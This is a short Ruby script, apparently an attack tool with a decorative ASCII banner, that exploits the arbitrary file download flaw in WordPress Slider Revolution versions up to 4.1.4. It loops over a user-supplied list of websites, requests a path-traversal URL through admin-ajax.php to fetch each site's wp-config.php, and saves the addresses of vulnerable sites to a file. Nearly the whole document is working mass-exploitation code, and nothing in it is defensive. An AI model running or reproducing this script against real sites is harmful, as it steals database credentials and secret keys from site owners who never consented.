# WordPress Slider Revolution Responsive <= 4.1.4 Arbitrary File Download vulnerability
require 'httparty'
require 'colorize'
system("clear")

red = "\e[31m"
green = "\e[32m"
blue = "\e[34m"
yellow = "\e[33m"
nothing = "\e[0m"

logo = """#{blue}
    __                   ___                    __                      
    )_)      ( _           )   _    )\/)         )_)  _   _  _ o  _   _  
    / \\ (_(  )_) (_(    _(_  (    (  (  (_(    /    (_( (  (  ( (_) ) ) 
                   _)        _)           _)            _) _)           #{nothing}
                   \e[35mðŸ† ðŸ†„ ðŸ…± ðŸ†ˆ#{nothing}  
                    #{yellow}     ðŸ…± ðŸ…´ ðŸ†ƒ ðŸ†ƒ ðŸ…´ ðŸ†#{nothing} 
                    \e[35m               ðŸ†ƒ ðŸ…· ðŸ…° ðŸ…½#{nothing} 
                    #{yellow}.                    ðŸ…¿ ðŸ†ˆ ðŸ†ƒ ðŸ…· ðŸ…¾ ðŸ…½#{nothing}
"""

puts logo.colorize(:blue)

def pAthwp
  print "Enter the path to your List Websites file: ".colorize(:cyan)
  file_path = gets.chomp

  begin
    reqlist = File.readlines(file_path)
  rescue Errno::ENOENT
    puts "File not found. Please make sure the file path is correct.".colorize(:red)
    return
  end

  for req in reqlist
    begin
      response = HTTParty.get(req.chomp)
      t = '/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php'
      r = HTTParty.get(req.chomp + t)

      puts "[+] url #{req}".colorize(:magenta)
      if r.body.start_with?('<?php')
        puts "Config ==> #{req}".colorize(:green)
        File.open('config.txt', 'a') { |file| file.puts(req.chomp + t) }
      else
        puts "[-] #{req}".colorize(:red)
      end
    rescue
      next
    end
  end
end

pAthwp